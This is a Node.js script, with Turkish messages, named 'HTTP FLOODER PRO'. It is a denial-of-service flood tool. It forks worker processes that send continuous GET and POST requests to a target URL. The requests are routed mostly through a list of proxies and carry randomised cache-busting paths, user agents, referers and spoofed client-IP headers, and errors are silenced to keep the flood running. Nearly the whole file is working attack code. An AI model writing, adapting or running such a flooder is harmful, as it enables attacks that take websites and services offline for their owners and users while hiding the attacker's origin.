"use strict";

const net = require("net");
const http = require("http");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");
const { performance } = require("perf_hooks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 6) {
    console.log(`
    Kullanim: node httpflood.js [HEDEF] [SURE] [THREAD] [PROXY_DOSYASI]
    `);
    process.exit();
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3]);
const threadCount = parseInt(process.argv[4]);
const proxyFile = process.argv[5];

const parsedTarget = url.parse(targetUrl);
const isHttps = parsedTarget.protocol === "https:";
const targetHost = parsedTarget.hostname;
const targetPort = parseInt(parsedTarget.port) || (isHttps ? 443 : 80);
let targetPath = parsedTarget.path || "/";


if (!targetPath.endsWith("/") && !targetPath.includes(".")) {
    targetPath += "/";
}

if (!fs.existsSync(proxyFile)) {
    console.log(`[-] Proxy dosyasi bulunamadi: ${proxyFile}`);
    process.exit();
}

let proxies = fs.readFileSync(proxyFile, "utf-8").split(/\r?\n/).filter(line => line.trim() && line.includes(":"));
proxies = proxies.map(p => {
    const [ip, port] = p.split(":");
    return { ip: ip.trim(), port: parseInt(port.trim()) };
});

console.log(`\n[=== HTTP FLOODER PRO ===]`);
console.log(`[+] Hedef: ${targetUrl}`);
console.log(`[+] Host: ${targetHost}:${targetPort}`);
console.log(`[+] Path: ${targetPath}`);
console.log(`[+] Protocol: ${isHttps ? "HTTPS" : "HTTP"}`);
console.log(`[+] Proxy sayisi: ${proxies.length}`);
console.log(`[+] Thread: ${threadCount} | Sure: ${duration}s`);
console.log(`[+] Baslangic: ${new Date().toLocaleTimeString()}\n`);


const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "curl/7.68.0",
    "Wget/1.20.3",
    "Python-urllib/3.9",
    "Go-http-client/1.1"
];


const referers = [
    "https://google.com/search?q=",
    "https://bing.com/search?q=",
    "https://yandex.com/search/?text=",
    "https://duckduckgo.com/?q=",
    "https://facebook.com/",
    "https://twitter.com/",
    "https://instagram.com/",
    "https://youtube.com/",
    "https://linkedin.com/",
    "https://github.com/",
    "https://stackoverflow.com/",
    "https://reddit.com/",
    "https://amazon.com/",
    "https://ebay.com/",
    "https://wikipedia.org/"
];


const accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/plain, */*; q=0.01"
];


const encodings = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip",
    "deflate",
    "br",
    "identity"
];

function randomUA() { return userAgents[Math.floor(Math.random() * userAgents.length)]; }
function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
function randomHex(len) { return crypto.randomBytes(len).toString("hex"); }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }


function generateRandomPath(basePath) {
    const pathTypes = [
        () => basePath,
        () => basePath + "?" + randomHex(8) + "=" + randomHex(4) + "&_=" + Date.now() + "&r=" + Math.random(),
        () => basePath + "?id=" + randomInt(1, 9999999) + "&session=" + randomHex(8) + "&t=" + Date.now(),
        () => basePath + randomHex(4) + "/" + randomHex(6) + "?" + randomHex(5) + "=" + randomInt(1, 9999),
        () => basePath + "api/" + randomHex(6) + "?callback=jsonp_" + randomInt(100000, 999999),
        () => basePath + "images/" + randomHex(8) + ".jpg?" + randomHex(4) + "=" + Date.now(),
        () => basePath + "css/" + randomHex(8) + ".css?v=" + randomInt(1, 999),
        () => basePath + "js/" + randomHex(8) + ".js?ver=" + randomInt(1, 999),
        () => basePath + "assets/" + randomHex(10) + "/" + randomHex(6) + ".html?" + randomHex(4),
        () => basePath + "wp-admin/admin-ajax.php?action=" + randomHex(6) + "&_wpnonce=" + randomHex(10),
        () => basePath + "cgi-bin/" + randomHex(6) + ".cgi?" + randomHex(4) + "=" + randomHex(8),
        () => basePath + "scripts/" + randomHex(6) + ".php?q=" + encodeURIComponent(randomHex(20)),
        () => basePath + "includes/" + randomHex(8) + ".asp?id=" + randomInt(1, 9999),
        () => basePath + "files/" + randomHex(12) + ".pdf?download=" + randomHex(6)
    ];
    return pathTypes[Math.floor(Math.random() * pathTypes.length)]();
}


function generatePostBody() {
    const bodyTypes = [
        `data=${randomHex(32)}&token=${randomHex(16)}&_=${Date.now()}`,
        `{"id":${randomInt(1,999999)},"name":"${randomHex(8)}","timestamp":${Date.now()}}`,
        `username=${randomHex(8)}&password=${randomHex(16)}&login=1`,
        `search=${encodeURIComponent(randomHex(12))}&page=${randomInt(1,100)}`,
        `comment=${encodeURIComponent("x".repeat(randomInt(100, 500)))}&post_id=${randomInt(1,9999)}`,
        `email=${randomHex(6)}@${randomHex(4)}.com&message=${encodeURIComponent(randomHex(50))}`,
        `------WebKitFormBoundary${randomHex(8)}\r\nContent-Disposition: form-data; name="${randomHex(6)}"\r\n\r\n${randomHex(20)}\r\n------WebKitFormBoundary${randomHex(8)}--`
    ];
    return bodyTypes[Math.floor(Math.random() * bodyTypes.length)];
}


function generateHeaders(host, path, xff, isPost = false) {
    const headers = {
        "Host": host,
        "User-Agent": randomUA(),
        "Accept": accepts[Math.floor(Math.random() * accepts.length)],
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": encodings[Math.floor(Math.random() * encodings.length)],
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "Referer": referers[Math.floor(Math.random() * referers.length)] + randomHex(6),
        "X-Forwarded-For": xff,
        "X-Real-IP": xff,
        "True-Client-IP": xff,
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "DNT": randomInt(0, 1).toString()
    };
    
    if (isPost) {
        headers["Content-Type"] = "application/x-www-form-urlencoded";
        headers["Content-Length"] = randomInt(50, 500).toString();
    }
    
    return headers;
}


function sendDirectRequest(callback) {
    const xff = randomIP();
    const path = generateRandomPath(targetPath);
    const isPost = Math.random() < 0.15; 
    
    const options = {
        hostname: targetHost,
        port: targetPort,
        path: path,
        method: isPost ? "POST" : "GET",
        headers: generateHeaders(targetHost, path, xff, isPost),
        timeout: 5000,
        rejectUnauthorized: false,
        agent: false,
        keepAlive: false
    };
    
    const protocol = isHttps ? require("https") : http;
    const startTime = performance.now();
    
    const req = protocol.request(options, (res) => {
        res.resume(); 
        const elapsed = performance.now() - startTime;
        totalRequests++;
        if (res.statusCode >= 200 && res.statusCode < 500) {
            successRequests++;
        }
        totalResponseTime += elapsed;
        logStats();
        if (callback) callback(null, res.statusCode);
    });
    
    req.on("error", (err) => {
        totalRequests++;
        errorRequests++;
        logStats();
        if (callback) callback(err);
    });
    
    req.on("timeout", () => {
        req.destroy();
        totalRequests++;
        errorRequests++;
        logStats();
        if (callback) callback(new Error("timeout"));
    });
    
    if (isPost) {
        req.write(generatePostBody());
    }
    req.end();
}


function sendProxyRequest(proxy, callback) {
    const xff = randomIP();
    const path = generateRandomPath(targetPath);
    const isPost = Math.random() < 0.15;
    
    const proxyOptions = {
        hostname: proxy.ip,
        port: proxy.port,
        method: isPost ? "POST" : "GET",
        path: `${targetUrl}${path}`,
        headers: generateHeaders(targetHost, path, xff, isPost),
        timeout: 8000,
        rejectUnauthorized: false,
        agent: false,
        keepAlive: false
    };
    
    const protocol = isHttps ? https : http;
    const startTime = performance.now();
    
    const req = protocol.request(proxyOptions, (res) => {
        res.resume();
        const elapsed = performance.now() - startTime;
        totalRequests++;
        if (res.statusCode >= 200 && res.statusCode < 500) {
            successRequests++;
        }
        totalResponseTime += elapsed;
        logStats();
        if (callback) callback(null, res.statusCode);
    });
    
    req.on("error", () => {
        totalRequests++;
        errorRequests++;
        logStats();
        if (callback) callback(new Error("proxy error"));
    });
    
    req.on("timeout", () => {
        req.destroy();
        totalRequests++;
        errorRequests++;
        logStats();
        if (callback) callback(new Error("timeout"));
    });
    
    if (isPost) {
        req.write(generatePostBody());
    }
    req.end();
}


let totalRequests = 0;
let successRequests = 0;
let errorRequests = 0;
let totalResponseTime = 0;
let lastLog = Date.now();
let activeConnections = 0;
let maxConcurrent = 0;

function logStats() {
    const now = Date.now();
    if (now - lastLog >= 3000) {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const rps = Math.floor(totalRequests / Math.max(1, elapsed));
        const avgResponse = totalRequests > 0 ? (totalResponseTime / totalRequests).toFixed(1) : 0;
        console.log(`[${elapsed}s] REQ:${totalRequests} | OK:${successRequests} | ERR:${errorRequests} | RPS:${rps} | AVG:${avgResponse}ms | CONC:${activeConnections}`);
        lastLog = now;
    }
}


let startTime;
let isRunning = true;

if (cluster.isMaster) {
    startTime = Date.now();
    console.log("[+] Master process basladi. Workerlar fork ediliyor...");
    
    for (let i = 0; i < threadCount; i++) {
        cluster.fork();
    }
    
    let activeWorkers = threadCount;
    cluster.on("exit", () => {
        activeWorkers--;
        if (activeWorkers === 0) {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            console.log(`\n[=== TEST TAMAMLANDI ===]`);
            console.log(`[+] Sure: ${elapsed} saniye`);
            console.log(`[+] Toplam istek: ${totalRequests}`);
            console.log(`[+] Basarili: ${successRequests}`);
            console.log(`[+] Basarisiz: ${errorRequests}`);
            console.log(`[+] Ortalama RPS: ${Math.floor(totalRequests / Math.max(1, elapsed))}`);
            console.log(`[+] Bitis: ${new Date().toLocaleTimeString()}`);
            process.exit(0);
        }
    });
    
    setTimeout(() => {
        console.log(`\n[+] ${duration} saniye doldu, workerlar kapatiliyor...`);
        isRunning = false;
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }, duration * 1000);
    
} else {

    startTime = Date.now();
    const workerId = cluster.worker.id;
    
    function sendRequest() {
        if (!isRunning) return;
        
        activeConnections++;
        if (activeConnections > maxConcurrent) maxConcurrent = activeConnections;
        
        if (proxies.length > 0 && Math.random() < 0.9) { // %90 proxy kullan
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            sendProxyRequest(proxy, () => {
                activeConnections--;
                setImmediate(sendRequest);
            });
        } else {
            sendDirectRequest(() => {
                activeConnections--;
                setImmediate(sendRequest);
            });
        }
    }
    

    const parallelPerWorker = Math.min(10, Math.floor(threadCount * 2));
    for (let i = 0; i < parallelPerWorker; i++) {
        sendRequest();
    }
}